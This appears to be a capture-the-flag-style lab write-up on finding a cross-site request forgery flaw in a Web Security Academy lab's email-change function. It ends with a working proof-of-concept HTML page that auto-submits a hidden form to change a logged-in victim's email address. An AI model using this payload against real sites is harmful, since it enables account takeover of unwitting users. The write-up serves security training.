<h1>Cross Site Request Forgery On Action With No CSRF Defenses</h1>

Scenario: I am testing the data integrity of a website located at 0a9c0040032ee23d80cffea8007e0099.web-security-academy[.]net. 
I want to know if any sensitive authenticated actions on the website are vulnerable to Cross Site Request Forgery (CSRF). Let's follow 
the checks below to find a CSRF vulnerability.

1. Check the SameSite attribute of the session cookie(s).
   ![image](https://github.com/user-attachments/assets/5160e69c-d267-4fc6-847f-4b0a825d7df4)

   As you can see, upon logging into the target website, my session cookie has the SameSite attribute set to 'None'. This means
   my session cookie can be used in cross-site requests.
2. Are there any authenticated actions that are not protected with CSRF tokens? Analyze the following process of changing a user's
   email address on the target website
   ![image](https://github.com/user-attachments/assets/4fc97bec-77c6-4fcb-9e2e-c1a027a6339d)
   ![image](https://github.com/user-attachments/assets/4900c730-d9c1-472e-956b-76af05b9edb9)
   ![image](https://github.com/user-attachments/assets/184b4c89-564f-4892-a4b4-2c6a390c0144)

   Notice that the user's email address is updated with an HTTP POST request that does not include any CSRF protection tokens in the request.

**We can now determine that the authenticated action of "Update email" on the target website is vulnerable to CSRF**

<h1>Proof Of Concept</h1>
To make a user change their email address on 0a9c0040032ee23d80cffea8007e0099.web-security-academy[.]net, an attacker can host the following file on their malicious domain. When the victim user visits the attacker's domain, their 0a9c0040032ee23d80cffea8007e0099.web-security-academy[.]net email address will be changed.

```
<!DOCTYPE html>
<html>
<body>
      <form action="https://0a9c0040032ee23d80cffea8007e0099.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="yougotpwned@evil-user.net">
      </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

